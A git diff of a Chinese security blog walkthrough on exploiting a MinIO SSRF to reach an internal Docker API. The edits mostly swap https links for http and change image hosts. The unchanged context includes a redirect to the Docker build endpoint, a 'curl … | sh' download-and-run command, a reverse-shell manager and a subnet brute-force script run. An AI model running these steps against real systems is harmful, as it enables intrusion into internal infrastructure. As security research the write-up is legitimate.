@@ -7,7 +7,7 @@ tags: SSRF
 
 **文章首发于火线安全**
 
-地址[https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api](https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api)
+地址[http://zone.huoxian.cn/d/2801-minio-ssrf-docker-api](http://zone.huoxian.cn/d/2801-minio-ssrf-docker-api)
 
 ## 前言
 
@@ -74,13 +74,13 @@ Content-Length: 76
 {"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
 ```
 
-![Snipaste_2023-05-14_23-07-35](https://cdn.laohuan.art/Snipaste_2023-05-14_23-07-35.png)
+![Snipaste_2023-05-14_23-07-35](http://qn.laohuan.xin/Snipaste_2023-05-14_23-07-35.png)
 
 可以看到我们的8080端口确实收到了请求
 
 利用过程如图
 
-![minio](https://cdn.laohuan.art/minio.png)
+![minio](http://qn.laohuan.xin/minio.png)
 
 这里黑客指定地址如上面的代码，也就是http://192.168.203.130:8080，假如我们把这个地址换为其他地址呢，比如docker api或者内网其他服务的地址。
 
@@ -141,7 +141,7 @@ Content-Length: 76
 {"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
 ```
 
-![Snipaste_2023-05-14_23-11-36](https://cdn.laohuan.art/Snipaste_2023-05-14_23-11-36-1684572404927-7.png)
+![Snipaste_2023-05-14_23-11-36](http://qn.laohuan.xin/Snipaste_2023-05-14_23-11-36-1684572404927-7.png)
 
 可以看到，已经成功的请求了我们的恶意dockerfile文件，并获得了一个shell
 
@@ -262,43 +262,43 @@ header('Location: http://192.168.203.130:2375/build?remote=http://192.168.203.13
 
    注意修改这串命令`curl http://192.168.203.143:13338 | sh`
 
-   这里可以使用nc的反弹命令，但nc长时间监听被别人扫描会有一些花里胡哨的东西，且nc只能管理单个shell，这里我用了一款shell管理器 [platypus](https://platypus-reverse-shell.vercel.app/)
+   这里可以使用nc的反弹命令，但nc长时间监听被别人扫描会有一些花里胡哨的东西，且nc只能管理单个shell，这里我用了一款shell管理器 [platypus](http://platypus-reverse-shell.vercel.app/)
 
    启动 platypus,便会生成链接地址
 
    `./platypus_linux_amd64`
 
-![image-20230520171912576](https://cdn.laohuan.art/image-20230520171912576.png)
+![image-20230520171912576](http://qn.laohuan.xin/image-20230520171912576.png)
 
 将生成的命令替换为dockerfile的命令即可
 
 3. 修改脚本相关注释内容即可
 
-   ![image-20230520172114318](https://cdn.laohuan.art/image-20230520172114318.png)
+   ![image-20230520172114318](http://qn.laohuan.xin/image-20230520172114318.png)
 
 我只设置了爆破c段，我觉得挑几个常见的c段爆破一下碰下运气就行了，没必要弄那么大的动静把内网来一遍
 
-![image-20230520172310029](https://cdn.laohuan.art/image-20230520172310029.png)
+![image-20230520172310029](http://qn.laohuan.xin/image-20230520172310029.png)
 
 确保这个目录下存在这三个文件，开启相关服务就可以直接运行脚本了
 
-![image-20230520172439983](https://cdn.laohuan.art/image-20230520172439983.png)
+![image-20230520172439983](http://qn.laohuan.xin/image-20230520172439983.png)
 
 `php -S 0.0.0.0:80`
 
 `python3 minio.py`
 
-![Snipaste_2023-05-14_22-08-01](https://cdn.laohuan.art/Snipaste_2023-05-14_22-08-01.png)
+![Snipaste_2023-05-14_22-08-01](http://qn.laohuan.xin/Snipaste_2023-05-14_22-08-01.png)
 
 可以看到目标最终请求了我们的Dockerfile文件
 
 platypu也成功获得了一个shell
 
-![Snipaste_2023-05-14_22-07-26](https://cdn.laohuan.art/Snipaste_2023-05-14_22-07-26.png)
+![Snipaste_2023-05-14_22-07-26](http://qn.laohuan.xin/Snipaste_2023-05-14_22-07-26.png)
 
 **演示视频**
 
-<iframe width="500" height="315" src="https://www.youtube.com/embed/wxZJwQP94ro" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+<iframe width="500" height="315" src="http://www.youtube.com/embed/wxZJwQP94ro" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 ## 总结
 
@@ -306,6 +306,6 @@ platypu也成功获得了一个shell
 
 参考文献
 
-* [https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)
-* [https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew](https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew)
+* [http://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html](http://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)
+* [http://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew](http://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew)
 
